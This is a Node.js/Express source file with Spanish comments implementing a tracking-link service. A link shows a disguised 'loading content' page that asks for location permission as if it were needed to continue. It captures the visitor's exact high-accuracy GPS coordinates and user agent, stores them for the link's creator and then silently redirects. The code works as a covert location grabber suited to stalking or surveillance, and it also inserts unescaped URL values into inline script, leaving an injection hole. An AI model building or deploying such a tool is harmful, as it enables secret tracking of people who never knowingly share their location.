// 1. Endpoint que entrega la interfaz de captura GPS
app.get('/r/:id', async (req, res) => {
  const { id } = req.params;

  // Verificamos que el enlace exista en Supabase
  const { data: linkRecord, error } = await supabase
    .from('tracking_links')
    .select('target_url')
    .eq('id', id)
    .single();

  if (error || !linkRecord) {
    return res.status(404).send('Enlace no válido o expirado.');
  }

  const destination = linkRecord.target_url;

  // Página web que solicita acceso al GPS del dispositivo
  const html = `
    <!DOCTYPE html>
    <html lang="es">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Cargando contenido...</title>
      <style>
        body { font-family: system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f8fafc; }
        .card { text-align: center; padding: 2rem; background: white; border-radius: 12px; box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); max-width: 90%; }
        .spinner { border: 3px solid #e2e8f0; border-top: 3px solid #2563eb; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 1rem auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
      </style>
    </head>
    <body>
      <div class="card">
        <h3>Cargando información</h3>
        <p>Por favor, confirma el permiso de ubicación para continuar al sitio...</p>
        <div class="spinner"></div>
      </div>

      <script>
        const trackingId = "${id}";
        const destination = "${destination}";

        function sendCoordsAndRedirect(payload) {
          fetch('/api/submit-gps', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ link_id: trackingId, ...payload })
          }).finally(() => {
            // Redirige al destino una vez procesado
            window.location.href = destination;
          });
        }

        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              sendCoordsAndRedirect({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                status: 'granted'
              });
            },
            (error) => {
              // Si el usuario rechaza o cancela, redirige igualmente
              sendCoordsAndRedirect({
                status: 'denied'
              });
            },
            {
              enableHighAccuracy: true, // Fuerza el uso del chip GPS
              timeout: 10000,
              maximumAge: 0
            }
          );
        } else {
          window.location.href = destination;
        }
      </script>
    </body>
    </html>
  `;

  res.send(html);
});

// 2. Endpoint que recibe las coordenadas exactas del GPS
app.post('/api/submit-gps', async (req, res) => {
  const { link_id, latitude, longitude, accuracy, status } = req.body;
  const userAgent = req.headers['user-agent'] || 'Desconocido';

  try {
    if (status === 'granted') {
      await supabase
        .from('tracking_logs')
        .insert([{
          link_id: link_id,
          latitude: latitude,
          longitude: longitude,
          user_agent: `${userAgent} [GPS Accuracy: ±${Math.round(accuracy)}m]`
        }]);
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error guardando GPS:', err.message);
    return res.status(500).json({ error: err.message });
  }
});
